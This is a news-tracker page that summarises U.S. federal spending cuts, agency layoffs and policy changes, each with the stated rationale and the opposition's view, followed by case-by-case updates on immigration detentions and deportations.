Opposition: “We’re anticipating we’re going to see greater need as more folks lose government jobs and benefits, which includes SNAP and Medicaid, and as inflation continues to have an impact on price of these items,” said a food bank director in Washington state. “It’s really a perfect storm of factors impacting food supply and we’re seeing shortages.” Politico (Lean Left) said Biden’s administration intended the programs “to build a more resilient food supply chain that didn’t just rely on major food companies,” and that the cut comes as school nutrition officials are “increasingly anxious” about affording healthy food for students. Sen. Jon Ossoff (D-GA) said the move “will hurt Georgia kids and Georgia farmers.”

Research, Science Grant Funding Cuts

Other

The Latest: The Department of Energy (DOE) and National Institutes of Health have moved to reduce the rate of overhead they pay as part of research grants for universities. DOGE said it worked with the U.S. National Science Foundation to cancel 402 ""wasteful"" diversity, equity and inclusion (DEI) grants, claiming the move will save $233 million.

Why? “The purpose of [DOE] funding to colleges and universities is to support scientific research – not foot the bill for administrative costs and facility upgrades,” Secretary of Energy Chris Wright said. DOE says the move will save over $400 million.

Opposition: Per Science Magazine (not rated):


	DOE’s directive does contain one new—and puzzling—element. It declares it will “terminate all grant awards to [academic institutions] that do not conform with this updated policy,” which is effective immediately. “Recipients subject to termination will receive separate notice and guidance,” it adds.

	Science lobbyists say they are baffled by that language. DOE awards the indirect costs along with the research grant, so institutions have no control over how much they receive—and therefore no power to violate the new policy, noted one senior administrator who requested anonymity because they hadn’t had time to fully analyze the policy.

State Department, UN, & NATO

Foreign Policy

The Latest: In mid-April, Sec. of State Marco Rubio put forth a plan to ""eliminate 132 domestic offices, cut around 700 positions in Washington, DC, and close offices focused on war crimes and global conflict"" at the State Department, per CNN (Lean Left).

Why? The White House’s Office of Management and Budget has proposed halving the budget for the Department of State. This includes eliminating all funding for most international organizations such as the United Nations, NATO headquarters, and other diplomatic missions.

Opposition: The New York Times (Lean Left) reported quotes from critics Sen. Jeanne Shaheen (D-NH), the top Democrat on the Foreign Relations Committee, and Sen. Brian Schatz (D-HI), the top Democrat on the appropriations committee. Shaheen said, “Why in the world would we cut funding for NATO at a moment when war is raging in Europe and security threats on the continent grow?” Schatz said, “While ultimately Congress controls the purse strings, recent reports about the administration’s plan to gut State Department personnel, U.S. presence overseas and foreign assistance are deeply troubling. These cuts don’t make America safer, they risk our security.""

AmeriCorps Cuts

Public Services

The Latest: Roughly 75% of full-time AmeriCorps employees have been placed on administrative leave. Gov. Newsom sued DOGE over the cuts.

Why? ""The agency has received roughly $1 billion in taxpayer funds every year, the House Higher Education and Workforce Development Subcommittee previously found, but had failed eight consecutive audits across the past decade,"" per Fox News (Right).

Opposition: “The work we perform for the American public is vital and we’ve now been stripped of our ability to do that,” an AmeriCorps employee placed on leave told POLITICO (Lean Left). “I worry about the impact that this will have on grantees, members, and volunteers who have committed themselves to providing service for Americans.”

Cuts, Layoffs at HHS

Public Services

What Happened: The Trump administration announced it would fire 10,000 full-time employees and close half of its regional offices. Previously, the administration cut National Institute of Health grants that support research institutions, whcih amounted to $4 billion annually. DOGE also posted on X that it had canceled $182 million worth of HHS contracts, which it said were entirely for administrative expenses, not health care programs. In February, the Centers for Disease Control and Prevention eliminated 1,300 probationary jobs, including half of its Intelligence Service officers who serve for two years on the front lines of public health responses.

Opposition and Support: The Association of American Medical Colleges said the decision to cut grants is “harmful and counterproductive” and would “diminish the nation’s research capacity,” urging the Trump administration to rescind the order. Sen. Katie Britt (R-AL) said she would work with the administration to protect research: ""A smart, targeted approach is needed in order to not hinder life-saving, groundbreaking research at high-achieving institutions like those in Alabama.”

The Latest: The Trump administration, in an internal memo, laid out $40 billion in HHS cuts. HHS has become the latest federal agency to offer buyouts. Most of HHS's 80,000 employees received an email offering a $25,000 buyout for ""voluntary separation,"" which they must choose whether to accept by Mar. 14. HHS is expected to cut a further 20,000 jobs across all departments. All 25 staffers for the Low Income Home Energy Assistance Program were also fired.

CFPB Layoffs on Hold

Economic Regulation

Why? ""The [Consumer Financial Protection] Bureau’s current balance of $711.6 million is in fact excessive in the current fiscal environment,"" said the new head of the Office of Management and Budget (OMB) Russell Vought. ""This spigot, long contributing to CFPB’s unaccountability, is now being turned off.""

Opposition: Sen. Elizabeth Warren (D-MA) said Vought was ""giving big banks and giant corporations the green light to scam families.""

The Latest: On April 18, a federal judge in Washington D.C. halted the planned firings of nearly 1,500 employees at the Consumer Financial Protection Bureau. On Feb.1, Vought ordered most of the nearly 1,700 CFPB employees to stop a majority of their work. On Feb, 13, between 70-100 employees were laid off from CFPB. Those laid off were term employees, meaning their positions were for a set length of time. The terminations follow 73 employees laid off earlier that week. On Feb, 16, a judge blocked Trump's mass layoffs.

DEI Workers Placed on Leave, Initiatives Paused

Public Services

The Latest: The NAACP sued the Department of Education on April 15, accusing it of illegally cutting funding to schools that have diversity, equity, and inclusion (DEI) programs. 

Removing All ""DEI"" Workers: ""The Biden Administration forced illegal and immoral discrimination programs, going by the name “diversity, equity, and inclusion” (DEI), into virtually all aspects of the Federal Government, in areas ranging from airline safety to the military,"" reads a Jan. 20 executive order.

Environmental Protection Agency: Per Bloomberg (Lean Left): ""The EPA on Thursday put 168 employees within its environmental justice office on administrative leave as the Trump administration executes presidential actions to roll back diversity initiatives... The agency ""is in the process of evaluating new structure and organization to ensure we are meeting our mission of protecting human health and the environment for all Americans.""

Military Academies: “Our Service Academies have been infiltrated by Woke Leftist Ideologues over the last four years. I have ordered the immediate dismissal of the Board of Visitors for the Army, Air Force, Navy, and Coast Guard,” Trump said on Truth Social. “We will have the strongest Military in History, and that begins by appointing new individuals to these Boards. We must make the Military Academies GREAT AGAIN!”

Universities: In March, the Trump admin paused $175M in federal funding to UPenn over its inclusion of trans athletes in women’s sports. It's also investigating 50+ other schools for alleged discrimination against white and Asian American students.

Opposition: Critics are concerned that pausing federal DEI work would significantly weaken efforts to strengthen equity. ""A lot of what we did in DEIA, specifically at the Labor Department, was to ensure that we were creating pathways to good paying jobs,"" said Alaysia Black Hackett, former chief diversity and equity officer at the Labor Department. ""Our strategy was to build an economy for all workers."" Some say the move violates Title VII of the Civil Rights Act of 1964: ""[Federal workers] are protected from either opposing discrimination or participating in any proceeding or activity related to opposing discrimination.""

Social Security Changes

Economic Regulation

The Latest: The Social Security Administration said beneficiaries will continue to have the ability to complete identity checks over the phone, reversing a previous announcement.

Why? The Trump administration has cited issues with overpayments, payments to ""dead people"", issues with living people being marked as dead, and more. It's moving to implement stricter identity verification measures.

Opposition: ""Retiree advocates warn that the change will negatively impact older Americans in rural areas, including those with disabilities, mobility limitations, those who live far from SSA offices and have limited internet access,"" according to AP (Left).

Cuts to Media Agencies 

Public Services

The Latest: Trump is planning an executive order to cut funding for NPR and PBS (both Lean Left).

Why? NPR QUOTE Among the cuts was the U.S. Agency for Global Media (USAGM), which oversees state media outlets Voice of America (VOA) (Center bias) and Radio Free Europe/Radio Liberty (RFE/RL). Trump nominee Kari Lake called USAGM “pound-for-pound the most corrupt agency in Washington DC.” On April 1, the Institute of Museum and Library Services placed its entire staff on administrative leave.

Opposition: In a statement, NPR said: ""Eliminating funding for the Corporation for Public Broadcasting would have a devastating impact on American communities across the nation that rely on public radio for trusted local and national news, culture, lifesaving emergency alerts, and public safety information."" RFE/RL CEO Stephen Capus said cutting funding to the outlet is “a massive gift to America’s enemies.”

College Funding Cuts, Probes

Public Services

Which Schools Have Lost Funding?


	Columbia University and the University of Pennsylvania, over alleged campus antisemitism and transgender athlete policies.
	Harvard University lost $2 billion in federal funding after refusing demands from the White House.
	Brown University had $510 million in funding paused.
	Cornell had over $1 billion in funds paused over alleged civil rights violations.
	Northwestern University had roughly $790 million paused over alleged civil rights violations.


Why? The administration argues that schools should not receive public funding if they are not in line with civil rights laws. Trump has threatened to revoke funding for any university that allows ""illegal"" protests on campus. 

Opposition: Some worry that Trump's vision of higher education limits academic freedom. A New York Times (Lean Left bias) piece described Trump's mandate as, “Teach what you must, defend 'the American tradition and Western civilization,' prepare people for the work force, and limit protests and research.”

Environmental Protection Agency

Other

Why? The Environmental Protection Agency began the termination of 280 of staffers in a ""reduction in force"" operation on April 21, and moved some staffers to new roles. EPA spokeswoman Molly Vaseliou said in an email, “Today, EPA notified diversity, equity, and inclusion and environmental justice employees that EPA will be conducting a Reduction in Force in accordance with the Office of Personnel Management Workforce Reshaping Handbook and federal regulations governing RIF procedures. The agency also notified certain statutory and mission essential employees that they are being reassigned to other offices.”

Opposition: Tracey Woodruff, a former senior scientist and policy adviser at the EPA who now teaches at UCSF said, “This is just terrible. EPA’s research program is already woefully underfunded, particularly when considering the enormity of the health problems faced by environmental exposure to the American public.”

NASA and Space Research Funding

Other

Why? According to The Washington Post (Lean Left), the White House has proposed a budget cut for NASA that would nearly half its budget from $7.3 billion to $3.9 billion. The White House didn't immediately offer a comment, but NASA press secretary Bethany Stevens said, “NASA has received the fiscal year 2026 budget passback from the Office of Management and Budget, and has begun the deliberative process.”

Opposition: Some scientists have pushed back, like Casey Dreier, chief of space policy for the Planetary Society, who said, “This is an extinction-level event for NASA science. It needlessly terminates functional, productive science missions and cancels new missions currently being built, wasting billions of taxpayer dollars in the process. This is neither efficient nor smart budgeting.”

Sanctuary City Funding

Other

The Latest: Trump said he is ""working on"" cutting all federal funding for cities that designate themselves as ""immigration sanctuaries.""

Why? “Consistent with applicable statutes, regulations, court orders, and terms, the Department of Justice shall pause the distribution of all funds until a review has been completed, terminate any agreements that are in violation of law or are the source of waste, fraud, or abuse, and initiate clawback or recoupment procedures, where appropriate,” new Attorney General Pam Bondi said when announcing the pause.

Opposition: Last month, the nonprofit U.S. Committee for Refugees and Immigrants said pausing funds “could disrupt critical programs funded by federal dollars, including public safety initiatives, disaster relief, housing support, and healthcare services. These cuts are not just an attack on immigrants—they are an assault on the well-being of every resident in these cities,” the nonprofit said in a statement.

Opposition: ""Critics worry DOGE’s rush to sell excess federal buildings could hurt agency missions, squander revenue opportunities,"" according to Government Executive (not rated).

Ending Language Translation Services

Public Services

The Latest: A contract between the National Weather Service (NWS) and an AI firm offering non-English language translations of emergency weather alerts was allowed to lapse, meaning translations of NWS products are no longer available. In March, U.S. Citizenship and Immigration Services reportedly canceled a contract providing translation services for people seeking information on their employment status or benefits.

Why? At the time of this writing, AllSides couldn't locate comment from government officials on either of the moves. A March 1 executive order from Trump reads, ""To promote unity, cultivate a shared American culture for all citizens, ensure consistency in government operations, and create a pathway to civic engagement, it is in America’s best interest for the Federal Government to designate one — and only one — official language.  Establishing English as the official language will not only streamline communication but also reinforce shared national values, and create a more cohesive and efficient society.""

Opposition: According to an official at the American Immigration Council, “Lack of interpretation services will only make it harder for many workers and families whose dominant language is not English from being able to correct immigration status errors in these databases. This risks people being wrongly denied benefits or being unfairly terminated from their jobs."" Associated Press (Left) reported, ""Not being able to read urgent weather alerts could be a matter of life or death, said Joseph Trujillo-Falcón, a researcher at the University of Illinois Urbana-Champaign who has worked with NOAA researching how to translate weather and climate information to the public, including the use of artificial intelligence.""

Public Services

Why? New National Institutes of Health (NIH) director Dr. Jay Bhattacharya said on April 2 that the agency is “committed to supporting research aimed at improving the health and well-being of every American” but will shift attention “away from politicized DEI and gender ideology studies.” At least 270 unspent grants worth a total of over $125 million have been canceled. See a full list of terminated NIH grants here.

Opposition: ""Hundreds of researchers, many of them panicked, have watched as the system that supports their life’s work — to address the myriad health disparities faced by sexual and gender minorities — has been upended,"" according to NBC News (Lean Left bias).

Cuts to Global Vaccine Aid

Foreign Policy

Why? According to a 281-page document reportedly sent to Congress on Mar. 24 from the United States Agency for International Development, the Trump administration is continuing significant cuts to foreign aid programs across the board. A State Department spokesperson reportedly said that “each award terminated was reviewed individually for alignment with agency and administration priorities, and terminations were executed where Secretary Rubio determined the award was inconsistent with the national interest or agency policy priorities.”

Opposition: The New York Times (Lean Left) called the move ""a retreat from a half-century-long effort to present the United States to the developing world as a compassionate ally and to lead the fight against infectious diseases that kill millions of people annually.""

Defense Department Cuts

Public Services

Why? Department of Defense Secretary Pete Hegseth, with the help of DOGE, cut $580 million in contracts and grants. “They are not a good use of taxpayer dollars. Ultimately, that’s who funds us, and we owe you transparency and make sure we’re using it well,” Hegseth said.

Opposition: The majority of the cuts are grants that fund DEI programs, COVID-19 research, climate research, and social science. Some argue that climate and COVID-19 research are particularly essential.

Battle Over USAID

Foreign Policy

Why? Trump and Musk have framed the US Agency for International Development (USAID) as unnecessary at best, and financially fraudulent at worst. The Trump administration said it will cut 90% of USAID contracts.

Opposition: Critics say friendly foreign governments and global perception of the U.S. will suffer. CNN (Lean Left) describes the USAID as “a key soft power tool of the US to foster relations with communities around the world.” As of Feb. 10, a judge had blocked the plan to put thousands of USAID workers on leave.

The Latest: A group of House Democrats introduced legislation on Feb. 11 to stop the Trump administration from breaking up the agency. On Mar. 5, a judge unfroze $2 billion in USAID aid in a loss for DOGE's efforts. On Mar. 10, Secretary of State Marco Rubio announced that 83% of USAID programs had been canceled. On Mar. 18, a federal judge ruled that USAID's dismantling likely violated the constitution.

Gov't Credit Cards Frozen, Canceled

Economic Regulation

The Latest: As of June 7, DOGE said it had canceled around 610,000 cards.

Details: On Mar. 11, DOGE says its canceled over 200,000 ""unused/unneeded"" credit cards of roughy 4.6 million government-issued cards. On Mar. 5, civilian Department of Defense workers were given a $1 spending limit on their government travel credit cards, with exemptions for ""direct support of military operations or a permanent change of station.""

Why? An executive order reads, ""To the maximum extent permitted by law, all credit cards held by agency employees shall be treated as frozen for 30 days from the date of this order, except for any credit cards held by employees engaged in, or charges related to employees utilizing such credit cards for, disaster relief or natural disaster response benefits or operations or other critical services as determined by the Agency Head, and subject to such additional individualized or categorical exceptions as the Agency Head, in consultation with the agency’s DOGE Team Lead, deems appropriate.""

Opposition: The move is ""upending work across the government, according to more than two dozen affected employees and records obtained"" by The Washington Post (Lean Left bias).

Billions in EPA Grants Canceled

Economic Regulation

The Details: The Trump administration is moving to recoup roughly $20 billion in Environmental Protection Agency (EPA) funds that were committed to climate-friendly groups. Trump added in a cabinent meeting that he wants to reduce the EPA's overall budget by 65%.

Why?: “The days of irresponsibly shoveling boatloads of cash to far-left activist groups in the name of environmental justice and climate equity are over,” EPA Director Lee Zeldin said. “The American public deserves a more transparent and accountable government than what transpired these past four years.”

Opposition: ""Your announcement is the latest example of the Trump Administration and its government efficiency 'experts' using unfounded claims of waste, fraud, and abuse as a smokescreen to ignore congressional spending authority and ignore court orders in order to freeze or terminate programs designed to reduce carbon pollution,"" wrote a group of Democrats on the Senate environmental and public works committee. In March, a judge blocked the Trump admin. from canceling roughly $14 billion in EPA grants.

""This policy is inconsistent with the medical, surgical, and mental health constraints on individuals with gender dysphoria or who have a current diagnosis or history of, or exhibit symptoms consistent with, gender dysphoria."" 

Opposition: “This is a purge of unprecedented magnitude,"" said Jennifer Levi, Senior Director of Transgender & Queer Rights. ""There is nothing confusing or complicated about it. The military has 30 days to identify anyone it thinks is transgender, and the only way to avoid discharge is to prove you are not transgender. This is an unconscionable ban that forces the removal of talented service members who put their lives on the line for our nation and slams the door on qualified patriots who meet every standard and want nothing more than to serve their country.”

Why? According to a Washington Post (Lean Left bias) report, President Donald Trump plans to dissolve the United States Postal Service board and move the organization under his control, placing it under the Commerce Department. The news comes two days after USPS announced that Postmaster General Louis DeJoy will step down from his leadership role in the agency. Privatizing USPS could result in it becoming a for-profit agency, cutting costs in alignment with DOGE's goals. “There is a lot of talk about the Postal Service being taken private,” Trump remarked back in December. “It’s a lot different today, between Amazon and UPS and FedEx and all the things that you didn’t have. But there is talk about that. It’s an idea that a lot of people have liked for a long time.”

Opposition: Mark Dimondstein, president of the American Postal Workers Union said, ""Any attack on the Postal Service would be part of the billionaire oligarch coup, directed not just at the postal workers our union represents, but the millions of Americans who rely on the critical public service our members provide every single day.""

Federal Benefits End for Some Migrants 

Economic Regulation

Why? The order accused the Biden administration of moving to ""repeatedly undercut"" federal laws prohibiting unauthorized immigrants from getting many taxpayer-funded benefits, ""resulting in the improper expenditure of significant taxpayer resources.""

Opposition: ""Undocumented immigrants are largely not eligible for federal benefits, with only some exceptions allowed for emergency situations, and many immigrant families are hesitant to enroll in programs they are eligible for,"" according to the New York Times (Lean Left).

End of ""Independent"" Agencies?

Other

Why? The executive order states that ""in order to improve the administration of the executive branch and to increase regulatory officials’ accountability to the American people, it shall be the policy of the executive branch to ensure Presidential supervision and control of the entire executive branch.""

Opposition: ""Given Trump's insistence on complete loyalty to him on the part of all government employees, this move is designed to extend his grip on the government to areas that previously have been nonpartisan,"" said Daniel Farber, a law professor at University of California, Berkeley, to NPR (Lean Left).

Advisory Boards Ordered to Disband

Other

Why? ""“Reducing the size of the Federal Government will minimize Government waste and abuse, reduce inflation, and promote American freedom and innovation,” the order states.

Opposition: The boards are ""part of an independent oversight process that our government needs and uses to better serve the American public, and that Congress needs and uses to better engage in congressional oversight and legislative action,"" said a fellow at Brookings Institution (Center). ""When you dismantle these entities, you rob the executive branch and Congress of critical information. Ultimately, this puts the privacy, civil liberties, and national security interests of the American public at risk.""

Trump Moves to Fire US Attorneys

Why? “Over the past four years, the Department of Justice has been politicized like never before. Therefore, I have instructed the termination of ALL remaining 'Biden Era' U.S. Attorneys,” Trump wrote on Truth Social. “We must 'clean house' IMMEDIATELY, and restore confidence. America’s Golden Age must have a fair Justice System – THAT BEGINS TODAY!” 

Opposition: The Trump administration's actions put it ""in conflict with nonpolitical career prosecutors who say these actions violate accepted practices and undermine the rule of law,"" according to the New York Times (Lean Left).

EV Charging Program Paused

Public Services

Why? “We are utilizing the unique authority afforded under the NEVI Formula Program to ensure the Program operates efficiently and effectively and aligns with current U.S. DOT policies and priorities,” a DOT spokesperson said in a statement.

Opposition: According to The Washington Post (Lean Left bias), the move, ""which comes as many states are still working to build out their public chargers supported by $5 billion in grants, could strike a major blow to an industry that has experienced slower-than-expected sales and could lose critical federal tax incentives in coming months.""

FEC Chair Refuses Firing Notice

Why? Trump is moving to oust his critics within the federal government, and Federal Election Chair Ellen Weintraub has criticized his unfounded claims of widespread voter fraud in federal elections. 

Opposition: “There’s a legal way to replace FEC commissioners-this isn’t it,” Weintraub wrote.

Why? “I can confirm that the more than eight million taxpayer dollars that have gone to essentially subsidizing subscriptions to Politico on the American taxpayer’s dime will no longer be happening,” White House press secretary Karoline Leavitt said.

US Considers Syria Withdrawal

Foreign Policy

Why? “Syria is in its own mess. They've got enough messes over there. They don't need us involved,"" Trump said on Jan. 30.

Opposition: Some say the move would significantly weaken the US-backed, Kurdish-led Syrian Defense Forces, which are currently working to fight and detain ISIS.

US to Stop Funding UNRWA

Foreign Policy

Why? ""I've always felt that the U.N. has tremendous potential,"" Trump said. ""It's not being well-run… A lot of these conflicts that we're working on should be settled, or at least we should have some help in settling them. But we never seem to get help. That should be the primary purpose of the U.N."" Israel banned the UNRWA over accusations that some members participated in the Oct. 7, 2023 attacks.

Opposition: Politico (Lean Left) said, “UNRWA is the main agency providing aid for Gaza’s population amid the humanitarian disaster caused by Israel’s offensive in the area after the Oct. 7 attack. But the U.N. fired several staffers last summer after an internal investigation found they may have been involved in the attack.”

Public Services

Why? The Trump administration has removed government websites and digital resources that stray from its positions on abortion, LGBTQ issues, Diversity , Equity and Inclusion (DEI) initiatives, and more. A judge ordered the websites be restored on Feb. 11.

Opposition: The Verge (Lean Left) reported that “scientists, researchers, and health and environmental advocates” have concerns about changes the Trump administration may make to government websites in their fields.

Some Inflation Reduction Act Funding Paused

Economic Regulation

Why? “In recent years, burdensome and ideologically motivated regulations have impeded the development of these resources, limited the generation of reliable and affordable electricity, reduced job creation, and inflicted high energy costs upon our citizens,” read the executive order.

Opposition: The move “significantly narrows the application of clean energy tax incentives” and “could also delay or even withdraw regulations, which would slow the ability of project sponsors to benefit from these provisions,” according to a writer for accounting group NOVOGRADAC.

US Leaves WHO

Foreign Policy

Why? ""The United States noticed its withdrawal from the World Health Organization (WHO) in 2020 due to the organization’s mishandling of the COVID-19 pandemic that arose out of Wuhan, China, and other global health crises, its failure to adopt urgently needed reforms, and its inability to demonstrate independence from the inappropriate political influence of WHO member states,"" reads Trump's executive order. ""In addition, the WHO continues to demand unfairly onerous payments from the United States, far out of proportion with other countries’ assessed payments.  China, with a population of 1.4 billion, has 300 percent of the population of the United States, yet contributes nearly 90 percent less to the WHO.""

Opposition: ""One of the strengths of our global public health system is the fact that it is a largely coordinated global public health system and this is because of organizations like the World Health Organization,” said Neil Maniar, director of Northeastern University’s master of public health program.. “When you start to pull players, major players like the United States, out of that system, it has a ripple effect and significant impacts on countries around the world, including our own,” he says.

US Exits Global Tax Deal

Foreign Policy

Why? “The OECD Global Tax Deal supported under the prior administration not only allows extraterritorial jurisdiction over American income but also limits our Nation’s ability to enact tax policies that serve the interests of American businesses and workers,” read the executive order.

Opposition: One economist said the move endangers “an initiative that could generate up to $32B in global tax revenue, particularly aiding low-income nations.”

Cuts Coming to FEMA?

Public Services

Why? During an interview with Dana Bash on CNN, Bash asked Noem if Trump can shut FEMA down and if he should. ""He can and I believe that he will do that evaluation with his team,"" Noem said. ""He'll work with Congress though to make sure it's done correctly and that we're still there to help folks who have a terrible disaster or crisis in their life."" Adding that we need to ""get rid of FEMA the way it exists today"" because ""you need to let the local officials make the decisions on how that is [resources and finances] deployed so it can be deployed much quicker and we don't need the bureaucracy that's picking and choosing winners.""

Opposition: Some argue that Trump's claims about corruption within FEMA are unfounded. Former FEMA administrator Deanne Criswell said in October, before Hurricane Milton hit, that disinformation about hurricanes reached a level ""that I've never seen before.""

Treasury to Stop Making Pennies

Economic Regulation

Why? President Trump said, ""For far too long the United States has minted pennies which literally cost us more than 2 cents. This is so wasteful! I have instructed my Secretary of the US Treasury to stop producing new pennies. Let's rip the waste out of our great nations budget, even if it's a penny at a time.""

Opposition: Advocates for the penny argue the change could have unintended consequences. Nickel production, which is already costly, will increase and rounding transactions to the nearest nickel may cause prices to rise, affecting low-income consumers.

AllSides is tracking the latest developments and updates on controversial deportations and detainments under the Trump administration. See daily developments on the cases of Kilmar Abrego Garcia, Mahmoud Khalil, and others.

The Department of Homeland Security (DHS) and Immigration and Customs Enforcement (ICE) have deported or detained some individuals who arrived in the US legally or held protected status. Reasons range from anti-Israel speech, to alleged gang affiliations, to “administrative errors”. Some are accusing the Trump administration of stifling First Amendment rights and other constitutional protections.

“Visiting America is not an entitlement,” said an op-ed from Secretary of State Marco Rubio published in April. “It is a privilege extended to those who respect our laws and values. And, as Secretary of State, I will never forget that.” On April 30, the Department of Homeland Security published a list of ""non-exhaustive list of facts, to help set the record straight on numerous false and misleading stories that have spread around news coverage and social media"" in regards to detainments and deportations.

LATEST DEVELOPMENTS


	Alligator Alcatraz, the recently-constructed ICE detention center in the Florida everglades, appears to be in the process of shutting down.
	On August 25, Kilmar Abrego Garcia filed a motion to re-open his asylum application. He stated that he fears torture and persecution in Ugana, where DHS announced potential intentions to deport him.
	Julio César Chávez Jr. was released from prison in Mexico and is awaiting trial for alleged involvement in cartels and alleged arms trafficking.
	Former Maine police officer Jon Luke Evans, a Jamaican citizen who overstayed his visa, has agreed to leave the country after being arrested by Immigration and Customs Enforcement (ICE) in July.
	Trump administration officials said the State Department has revoked more than 6,000 student visas, citing assault, driving under the influence, burglary, and “support for terrorism"" as the most frequent legal violations.
	Kelly Yu, owner of an Arizona sushi restaurant who has lived in the US for 21 years, was detained by ICE in May following a routine immigration check-in. She remains in ICE custody.
	ICE has plans to purchase AI technology that will scan people's retinas to identify people to deport, according to Arizona's Family (Center bias). Some technology experts have questioned the accuracy of such technologies.


Unauthorized - Jon Luke Evans

Self-deported

Latest Updates: 


	On July 18, ICE said that Evans agreed to voluntarily depart the country rather than receive a deportation order.
	Evans was held in the Donald W. Wyatt Detention Facility in Rhode Island before being transferred to an ICE facility in Massachusetts.
	On July 25, Evans was arrested while attempting to purchase a firearm.


Immigration Status: Jon Luke Evans entered the country legally in September 2023 on a visa. Evans was employed by the Old Orchard Beach Police Department in Maine, which reportedly verified his work eligibility through the DHS E-Verify program. ICE alleged that Evans overstayed his visa and therefore was in the country without authorization.Go ad-freeAbout these ads

Reason for Detention: Evans was arrested for attempting to purchase a firearm, which was unlawful due to the fact that reserve officers are not allowed to bring department-issued firearms home, or allowed to purchase or carry any other firearms. ICE ERO Boston acting Field Office Director Patricia H. Hyde said, ""Jon Luke Evans not only broke U.S. immigration law, but he also illegally attempted to purchase a firearm. Shockingly, Evans was employed as a local law enforcement officer.""

Opposition: Old Orchard Beach Police Chief Elise Chard defended the department's hiring processes, according to Newsweek (Center bias), and emphasized the fact that federal officials confirmed his work eligibility before he became employed.

		Zita Yu
	


Unauthorized - Kelly Yu

Detained in the U.S.

Latest Updates: Yu was detained by ICE in May following a routine immigration check-in. She remains in ICE custody.

Immigration Status: Yu entered the US from China without authorization in 2004. She was seeking asylum due to China's ""one child"" policy at the time. She is married to a US citizen and the mother of a college-age daughter Zita Yu, who is also an American citizen.

Reason for Detention: Yu's asylum case was denied and she received a removal order from a judge in 2004. Her appeals have since been denied, with her most recent appeal being rejected in 2016.

Opposition: Chair of the GOP Legislative District 29 in Arizona Lisa Everett is working with a Democratic activist in Arizona to call for Yu's release. Everett said, ""Kelly is everything we want in an immigrant. She is well loved in her community she gives back to."" Sen. Mark Kelly (D-AZ) said, ""Donald Trump is going after people like Kelly Yu and Maria Pelaez who are mothers, grandmothers, members of our communities, instead of using ICE resources to go after criminals.""

Visitor Visa* - Roland Beainy

Released on bail/bond

Latest Update: 


	Roland Beainy, co-owner of the Texas chain ""Trump Burger,"" was arrested and faces potential deportation for allegedly overstaying his visa. His immigration court hearing is scheduled for Nov. 18.


Immigration Status: Beainy entered the US in 2019 on a visitor visa but stayed past his required departure date of February 2024, according to ICE. Newsweek (Center bias) wrote, ""Reports had suggested he had applied for legal status in 2021 via the woman claiming to be his wife.""

Reason for Detention: DHS released a statement, saying, ""The Department of Homeland Security has zero tolerance for immigration fraud, and this individual's claims are baseless. USCIS revoked the petition after evidence, including admissions from the petitioner's own family, exposed his marriage as a sham designed to game the system."" An ICE spokesperson told Newsweek, ""Under the current administration, ICE is committed to restore integrity to our nation's immigration system by holding all individuals accountable who illegally enter the country or overstay the terms of their admission. This is true regardless of what restaurant you own or political beliefs you might have.""

Opposition: Beainy has not commented on the story.

Green Card Applicant/Humanitarian Parole - Zia

Detained in the U.S.

Latest Update: 


	A judge issued a temporary stay which prevents Zia from being deported immediately, though he remains in government custody.
	Zia was arrested by armed, masked immigration agents after an appointment related to his green card application.


Immigration Status: Zia was approved for humanitarian parole into the US in 2024 because of direct threats against his life from the Afghan Taliban government. He was in the process of applying for a green card through a program that protects people who worked for US forces in other countries. Zia worked with the US military during the war in Afghanistan.

Reason for Detention: DHS said that Zia is under investigation for a “serious criminal allegation,” but did not provide further details. Zia's attorney said he has no criminal history and has no understanding of what DHS is referring to.

Opposition: The founder of #AfghanEvac said his group and other veterans organizations were working for the release of Zia and other detained Afghans. ""It’s about whether this country honors its word to those who risk everything,"" he said.

Visa/Permit to Work (Status Unknown) - Karem Tadros

Awaiting deportation order

Latest Update: 


	Sudan and Libya rejected Tadros's case. There remains a possibility of deporting Tadros to Uzbekistan.
	A US district judge ruled that because Tadros cannot be deported to his home country of Egypt, ""ICE may identify a third country within thirty to sixty days of this order to which the Petitioner may be removed.""


Immigration Status: Tadros was brought to the US in 1989 when he was 3 or 4 years old, according to Tadros and his attorney. His family members all obtained citizenship, though his application was halted in 2006 due to a drug-related conviction. He currently holds a valid work permit that is set to be renewed in August.

Reason for Detention: Federal immigration officers came to Tadros's home saying they had a warrant for his arrest and that there were ""administrative problem in their office that needs to be taken care of."" DHS has not specifically commented on his case, though Trisha McLaughlin previously told Newsweek ""The Trump administration is enforcing immigration laws—something the previous administration failed to do. Those who violate these laws will be processed, detained and removed as required.""

Opposition: At Tadros's legal proceedings in 2009, a federal judge found that Tadros could not be deported to Egypt, as he was at risk of persecution for being Christian and not knowing the language. On June 16, a U.S. District Judge ordering his release, finding it unlawful for the government to keep Tadros detained.

Asylum Seeker - Hilary Rivers

Detained in the U.S.

Latest Update: Rivers was detained after his asylum hearing at a San Fransisco court on June 26. He is being held at an ICE detention center in Bakersfield, California.

Immigration Status: Rivers immigrated to the US from Guatemala due to “traumatic and severe” persecution for being gay. His asylum application is pending. The outlet Them (Lean Left bias) noted that Hilary Rivers is this man's stage name as a drag performer and that his legal name is not being reported due to confidentiality.

Reason for Detention: Rivers was arrested after his asylum hearing. A government lawyer moved to dismiss the case, though the judge denied that motion. 

Opposition: San Fransisco advocacy groups such as SF Pride and the San Francisco Immigrant Legal Defense Collaborative have lobbied for his release. The director of a nonprofit that hosted an event in support of Rivers said Rivers's ""primary concern is for people to understand that he was doing things following the law and that he was not a criminal.""

Tourist Visa* - Julio César Chávez Jr.

Removed from the U.S.

Latest Update: 


	Chavez was released from prison in Mexico and is awaiting trial for alleged involvement in cartels and alleged arms trafficking.
	Chavez was deported to Mexico and is reportedly being held in a maximum security prison in the state of Senora.
	On July 22, Chavez's lawyer Michael Goldstein told an entertainment commentator, ""My understanding is that he remains in ICE custody in Texas.""
	Chavez Jr. missed a court appointment on July 7 for a case unrelated to the ICE arrest for reasons unknown to his lawyer, who has not been able to locate Chavez Jr. ""We have no idea. We have no information. Unfortunately,"" his lawyer told USA TODAY (Lean Left bias).
	As of July 5, Chavez Jr.'s lawyer determined he was being kept in custody in Hidalgo, Texas. 
	ICE detained Chavez Jr. on July 2, a few days after a high-profile boxing match against social media influencer Jake Paul. On July 3, DHS stated it was in the process of deporting him due to alleged ties to drug cartels.


Immigration Status: Chávez Jr. entered the US on a tourist visa in August of 2023. The visa expired in February 2024, but he applied for permanent residency in April 2024 based on his marriage to a US citizen. On June 27, the government determined he was in the country illegally and could be removed.

Reason for Detention: A DHS statement claims Chavez Jr. lied on his immigration application and that he has warrants for his arrest in Mexico for alleged involvement in “organized crime and trafficking firearms, ammunition, and explosives.""

